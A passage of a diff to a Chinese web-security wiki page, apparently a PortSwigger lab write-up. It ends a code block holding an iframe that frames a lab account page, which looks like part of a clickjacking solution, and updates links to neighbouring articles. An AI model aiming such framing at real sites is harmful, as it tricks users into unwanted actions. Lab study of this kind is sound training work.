class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a9a0010038a45ffc436c9d000f50019.web-security-academy.net/my-account&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <div class="article-footer fs14"></div>
 </article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">回顾上一篇</div><a href="/wiki/portswigger/directory-traversal.html">portswigger 靶场之目录遍历</a></div><div class="item" id="next"><div class="note">接下来阅读</div><a href="/wiki/portswigger/authentication.html">PortSwigger 之“身份认证”</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">回顾上一篇</div><a href="/wiki/portswigger/directory-traversal">portswigger 靶场之目录遍历</a></div><div class="item" id="next"><div class="note">接下来阅读</div><a href="/wiki/portswigger/authentication">PortSwigger 之“身份认证”</a></div></section></div>
 
 
 
